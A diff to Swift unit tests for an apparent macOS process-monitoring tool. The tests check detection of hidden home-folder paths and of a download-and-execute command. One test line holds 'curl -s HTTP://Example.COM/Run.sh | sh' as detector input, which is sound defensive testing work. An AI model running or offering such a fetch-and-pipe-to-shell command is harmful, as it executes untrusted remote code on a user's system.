@@ -231,6 +231,19 @@ final class SentinelRulesTests: XCTestCase {
         XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/library/application support/.sync/helper"))
     }
 
+    func testAHiddenFileDirectlyInTheHomeFolderIsHidden() {
+        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.helper"))
+        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.mainhelper"))
+        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/me/helper"))
+        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/.helper"), "no home folder in that path")
+        for known in ["/users/me/.foundry/bin/anvil", "/users/me/.opencode/bin/opencode", "/users/me/.lmstudio/bin/lms",
+                      "/users/me/.pub-cache/bin/melos", "/users/me/.rvm/bin/ruby"] {
+            XCTAssertFalse(SentinelRules.isHiddenUserPath(known), known)
+        }
+        let result = evaluate(subject("helper", path: "/Users/me/.helper"))
+        XCTAssertEqual(result.signals.first { $0.kind == .hiddenLocation }?.severity, .notable, "\(result.signals)")
+    }
+
     func testEvidenceKeepsOriginalCapitalisation() {
         let signals = CommandPatterns.signals(commandLine: "curl -s HTTP://Example.COM/Run.sh | sh", program: "curl")
         XCTAssertEqual(signals.first { $0.kind == .downloadAndExecute }?.evidence, "HTTP://Example.COM/Run.sh")
